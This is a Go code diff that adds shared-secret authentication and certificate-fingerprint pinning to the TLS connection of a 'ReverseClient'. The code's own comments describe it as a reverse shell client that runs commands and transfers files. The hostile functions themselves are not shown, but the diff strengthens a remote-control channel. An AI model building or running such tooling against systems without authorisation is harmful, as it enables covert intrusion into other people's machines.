@@ -2,7 +2,9 @@ package client
 
 import (
 	"bufio"
+	"crypto/sha256"
 	"crypto/tls"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"io"
@@ -21,6 +23,8 @@ import (
 // and handles command execution and file transfers.
 type ReverseClient struct {
 	target            string
+	sharedSecret      string     // Optional shared secret for authentication
+	certFingerprint   string     // Optional expected certificate fingerprint
 	conn              *tls.Conn
 	reader            *bufio.Reader
 	writer            *bufio.Writer
@@ -35,8 +39,12 @@ type ReverseClient struct {
 }
 
 // NewReverseClient creates a new reverse shell client
-func NewReverseClient(target string) *ReverseClient {
-	return &ReverseClient{target: target}
+func NewReverseClient(target, sharedSecret, certFingerprint string) *ReverseClient {
+	return &ReverseClient{
+		target:          target,
+		sharedSecret:    sharedSecret,
+		certFingerprint: certFingerprint,
+	}
 }
 
 // Connect establishes a TLS connection to the listener
@@ -48,9 +56,60 @@ func (rc *ReverseClient) Connect() error {
 		return fmt.Errorf("connection failed: %w", err)
 	}
 
+	// Validate certificate fingerprint if provided
+	if rc.certFingerprint != "" {
+		if len(conn.ConnectionState().PeerCertificates) == 0 {
+			conn.Close()
+			return fmt.Errorf("no server certificate received")
+		}
+
+		certDER := conn.ConnectionState().PeerCertificates[0].Raw
+		hash := sha256.Sum256(certDER)
+		fingerprint := hex.EncodeToString(hash[:])
+
+		if fingerprint != rc.certFingerprint {
+			conn.Close()
+			return fmt.Errorf("certificate fingerprint mismatch!\nExpected: %s\nReceived: %s\n⚠ WARNING: Possible man-in-the-middle attack!", rc.certFingerprint, fingerprint)
+		}
+		log.Printf("✓ Certificate fingerprint validated: %s", fingerprint)
+	}
+
 	rc.conn = conn
 	rc.reader = bufio.NewReader(conn)
 	rc.writer = bufio.NewWriter(conn)
+
+	// Perform authentication if shared secret is provided
+	if rc.sharedSecret != "" {
+		// Send AUTH command
+		authCmd := fmt.Sprintf("%s %s\n", protocol.CmdAuth, rc.sharedSecret)
+		if _, err := rc.writer.WriteString(authCmd); err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to send auth: %w", err)
+		}
+		if err := rc.writer.Flush(); err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to flush auth: %w", err)
+		}
+
+		// Wait for AUTH_OK or AUTH_FAILED
+		response, err := rc.reader.ReadString('\n')
+		if err != nil {
+			conn.Close()
+			return fmt.Errorf("failed to read auth response: %w", err)
+		}
+
+		response = strings.TrimSpace(response)
+		if response == protocol.CmdAuthFailed {
+			conn.Close()
+			return fmt.Errorf("authentication failed: invalid shared secret")
+		}
+		if response != protocol.CmdAuthOk {
+			conn.Close()
+			return fmt.Errorf("unexpected auth response: %s", response)
+		}
+		log.Printf("✓ Authentication successful")
+	}
+
 	rc.isConnected = true
 	return nil
 }
